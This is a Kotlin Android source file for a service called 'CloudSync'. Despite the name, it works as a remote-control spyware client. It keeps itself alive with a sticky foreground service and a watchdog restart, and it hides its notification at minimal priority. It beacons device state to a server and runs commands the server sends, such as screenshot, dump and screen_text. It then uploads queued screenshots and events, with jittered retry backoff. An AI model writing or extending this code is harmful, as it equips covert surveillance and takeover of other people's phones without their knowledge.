package com.cloudsync.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections
import kotlin.concurrent.thread
import kotlin.random.Random

class SyncService : Service() {

    companion object {
        const val CANAL = "cloudsync"
        const val ID_NOTIF = 1001
        @Volatile var instancia: SyncService? = null
    }

    private lateinit var p: Prefs
    private var hilo: Thread? = null
    @Volatile private var activo = true

    private val eventos = Collections.synchronizedList(mutableListOf<JSONObject>())
    private val shots = Collections.synchronizedList(mutableListOf<JSONObject>())

    override fun onCreate() {
        super.onCreate()
        instancia = this
        p = Prefs(this)
        crearCanal()
        ServiceCompat.startForeground(
            this, ID_NOTIF, notificacion(),
            if (Build.VERSION.SDK_INT >= 29) ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
        )
        hilo = thread { bucle() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY

    override fun onBind(i: Intent?): IBinder? = null

    override fun onDestroy() {
        instancia = null
        activo = false
        Watchdog.programar(this, 8000)
        super.onDestroy()
    }

    private fun crearCanal() {
        val ch = NotificationChannel(CANAL, "Sincronizacion", NotificationManager.IMPORTANCE_MIN)
        ch.setShowBadge(false)
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
    }

    private fun notificacion(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CANAL)
            .setContentTitle("CloudSync")
            .setContentText("Sincronizacion activa")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    fun evento(tipo: String, data: JSONObject) {
        synchronized(eventos) {
            if (eventos.size > 5000) eventos.removeAt(0)
            eventos.add(JSONObject().put("ts", System.currentTimeMillis()).put("type", tipo).put("data", data))
        }
    }

    fun shot(b64: String, w: Int, h: Int, hash: String) {
        synchronized(shots) {
            if (shots.size > 40) shots.removeAt(0)
            shots.add(JSONObject()
                .put("ts", System.currentTimeMillis())
                .put("hash", hash).put("w", w).put("h", h)
                .put("mime", "image/jpeg").put("screen", "main")
                .put("data", b64))
        }
    }

    private fun bateria(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun red(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n = cm.activeNetwork ?: return "sin red"
        val c = cm.getNetworkCapabilities(n) ?: return "?"
        return when {
            c.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            c.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "datos"
            else -> "otro"
        }
    }

    private fun bucle() {
        var back = 0
        var ultimoPush = System.currentTimeMillis()
        Thread.sleep(2000)
        while (activo) {
            Watchdog.programar(this, 120000)
            try {
                if (p.deviceId == null || p.token == null) {
                    if (!Api.register(p)) { back = dormir(back); continue }
                    evento("hello", JSONObject().put("model", Build.MODEL))
                }

                val beacon = JSONObject()
                    .put("battery", bateria())
                    .put("charging", true)
                    .put("net", red())
                    .put("screen_on", true)

                var r = Api.post("/api/v1/sync/beacon", beacon, p.deviceId, p.token)
                if (r.first == 401) {
                    Api.register(p)
                    r = Api.post("/api/v1/sync/beacon", beacon, p.deviceId, p.token)
                }
                if (r.first >= 300 || r.second == null) { back = dormir(back); continue }
                back = 0

                val cmds = r.second?.optJSONArray("commands")
                if (cmds != null) {
                    for (i in 0 until cmds.length()) {
                        if (!activo) break
                        val c = cmds.getJSONObject(i)
                        val id = c.optInt("id")
                        val nombre = c.optString("cmd")
                        val args = c.optJSONObject("args") ?: JSONObject()
                        val res = Comandos.ejecutar(this, nombre, args)
                        Api.post("/api/v1/sync/result",
                            JSONObject().put("id", id).put("ok", res.first).put("result", res.second),
                            p.deviceId, p.token)
                        if (nombre == "screenshot" || nombre == "dump" || nombre == "screen_text") push()
                        if (nombre == "die") { activo = false; stopSelf(); return }
                    }
                }

                if (System.currentTimeMillis() - ultimoPush > 2500) {
                    push()
                    ultimoPush = System.currentTimeMillis()
                }

            } catch (e: Exception) {
                back = dormir(back)
                continue
            }
            Thread.sleep((1500 + Random.nextInt(-500, 501)).coerceAtLeast(600).toLong())
        }
    }

    private fun dormir(i: Int): Int {
        val lista = intArrayOf(1000, 2000, 4000, 8000, 16000, 30000, 60000, 120000, 300000)
        val idx = if (i < lista.size) i else lista.size - 1
        Thread.sleep((lista[idx] + Random.nextInt(lista[idx] / 4 + 1)).toLong())
        return if (i < lista.size - 1) i + 1 else i
    }

    private fun push() {
        val ev: List<JSONObject>
        val sh: List<JSONObject>
        synchronized(eventos) { ev = ArrayList(eventos); eventos.clear() }
        synchronized(shots) { sh = ArrayList(shots); shots.clear() }
        if (ev.isEmpty() && sh.isEmpty()) return
        try {
            val body = JSONObject().put("events", JSONArray(ev)).put("shots", JSONArray(sh))
            val r = Api.post("/api/v1/sync/push", body, p.deviceId, p.token)
            if (r.first >= 300) {
                synchronized(eventos) { eventos.addAll(0, ev) }
                synchronized(shots) { shots.addAll(0, sh) }
            }
        } catch (e: Exception) {
            synchronized(eventos) { eventos.addAll(0, ev) }
            synchronized(shots) { shots.addAll(0, sh) }
        }
    }
}